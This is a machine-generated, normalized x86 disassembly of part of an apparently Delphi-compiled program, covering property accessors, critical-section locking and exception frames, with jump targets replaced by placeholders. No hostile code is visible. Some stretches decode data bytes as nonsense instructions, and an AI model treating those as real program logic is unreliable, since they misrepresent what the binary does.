mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_40416c
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_40416c
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_414a10
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40416c
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404424
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408620
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404424
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40326c
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402884
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40437c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41456d
lea eax [ ebp - 0x208 ]
call sub_404118
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404424
sub_4145c4
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_4145b4
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_414a10
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_414638
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4145b4
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_4145b4
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_414bb8
sete al
xor eax eax
jmp r-xdata
sub_4146d4
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_4146d4
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_414720
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_4146d4
pop ecx
pop edx
retn
sub_41475c
[ edi ]
inc eax
add [ eax ] cl
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_414a10
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_414990
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_41476c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4147cd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_405238
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147d4
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_40331c
sub_41481c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_414990
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_414a10
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_414870
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4148a8
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_414990
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4148e4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4036d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414947
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41494e
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4149e8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4033d0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414a10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414ab8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_405238
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_414ac8
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414b9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414b81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_405240
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b88
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_40326c
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_40437c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_408180
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_414bc8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_414c37
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c3e
retn
call sub_41476c
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_405400
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_40f510
sub_414c40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_414ce1
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ce8
retn
mov eax rw-data
call sub_4146c8
mov eax sub_40f210
mov [ rw-data ] eax
mov eax sub_40ed60
mov [ rw-data ] eax
mov edx sub_40ec70
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f510
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4142bc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f824
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412814
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412f3c
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_414cef
add [ edi + 0x640000ff ] ch
jbe r-xdata
cdq
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax + 0x640000ff ] dl
jbe r-xdata
test bh bh
add [ eax ] al
jbe r-xdata
add [ ebx + 0x640000ff ] bl
jbe r-xdata
0x640000ff 0x4976
add [ ecx + 0x640000ff ] dl
jbe r-xdata
add [ ebp + 0x640000ff ] al
jbe r-xdata
test edi edi
add [ eax ] al
jbe r-xdata
add [ edi + edi * 8 + 0x76640000 ] bl
dec ecx
fwait
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx + 0x640000ff ] dl
jbe r-xdata
rcl [ ebp + 0x68 ] 0x11
dec esi
inc ecx
add [ edi + edi * 8 + 0x30 ] ah
add [ esi + 0x640000ff ] al
jbe r-xdata
xchg edi edi
add [ eax ] al
jbe r-xdata
add [ esi + 0x640000ff ] bl
jbe r-xdata
add [ ebp + 0x640000ff ] bl
jbe r-xdata
pushfd
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebx + 0x640000ff ] dl
jbe r-xdata
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
push [ eax ]
add [ edi + 0x640000ff ] al
jbe r-xdata
js r-xdata
add [ eax + 0x640000ff ] cl
jbe r-xdata
mov bh bh
add [ eax ] al
jbe r-xdata
add [ edi + 0x640000ff ] bl
jbe r-xdata
popfd
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 + 0x76640000 ] dl
dec ecx
add [ ebp + 0x640000ff ] dl
jbe r-xdata
add [ esi ] ch
add [ eax ] al
add [ ecx ] dh
ror [ edx + 0x448d0150 ] cl
adc [ edx ] al
retn
mov [ fs : eax ] edx
push r-xdata
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
add [ ecx + 0x640000ff ] cl
jbe r-xdata
mov edi edi
add [ eax ] al
jbe r-xdata
add [ eax + 0x640000ff ] al
jbe r-xdata
lahf
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi + 0x640000ff ] dl
jbe r-xdata
retn
add [ edx + 0x640000ff ] cl
jbe r-xdata
mov bh bh
add [ eax ] al
jbe r-xdata
add [ ecx + 0x640000ff ] al
jbe r-xdata
cmp bh 0x0
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + 0x640000ff ] dl
jbe r-xdata
pop ebp
retn
add [ ebx + 0x640000ff ] cl
jbe r-xdata
mov edi edi
add [ eax ] al
jbe r-xdata
add [ edx + 0x640000ff ] al
jbe r-xdata
cmp edi 0x76640000
dec ecx
add [ eax + 0x640000ff ] bl
jbe r-xdata
dec ecx
add [ ecx ] al
retn
add [ edi + edi * 8 + 0x76640000 ] cl
dec ecx
add [ ebp + 0x640000ff ] cl
jbe r-xdata
add [ ebx + 0x640000ff ] al
jbe r-xdata
cmp bh 0x0
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx + 0x640000ff ] bl
jbe r-xdata
add [ gs : eax ] al
add bh bh
add [ esi + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_414e11
push [ fs : eax ]
add [ edi + edi * 8 + 0x76640000 ] al
dec ecx
cmp edi 0x0
add [ esi + esi * 2 + 0x49 ] ah
add [ edx + 0x640000ff ] bl
jbe r-xdata
sub_414e5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414f1a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_414e50
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_414e50
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_40850c
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_40416c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_408180
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f21
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4080a0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40416c
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_40437c
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_414f34
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_414f80
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_414e50
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_408648
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414f34
mov edx [ rw-data ]
mov eax esi
call sub_408180
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_408180
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_408648
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_414fe4
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_415054
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_4150a8
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_4150d8
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_41514c
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_4151a8
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_4151ec
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_415268
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4043b4
mov ecx esp
mov edx esi
mov eax ebx
call sub_4151ec
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_4152b0
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_41529c
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_4152f0
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_41529c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_415330
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415378
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41544c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4043a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41537f
lea eax [ ebp - 0x4 ]
call sub_4047f8
retn
sub_415388
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4153d0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404944
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_415534
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4153d7
lea eax [ ebp - 0x4 ]
call sub_4047f8
retn
sub_4153e0
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_415240
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_4152b0
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_415330
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_404118
pop ebx
retn
sub_415420
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_415268
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_4152f0
pop ebx
retn
dec bl
je r-xdata
call sub_415388
jmp r-xdata
pop ebx
retn
sub_41544c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_415524
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_4153e0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404944
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41552b
lea eax [ ebp - 0x10 ]
call sub_404118
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404834
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4047f8
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415534
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4155fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4043a0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_415420
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415601
lea eax [ ebp - 0xc ]
call sub_404118
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404834
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415608
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_414e50
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_415648 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
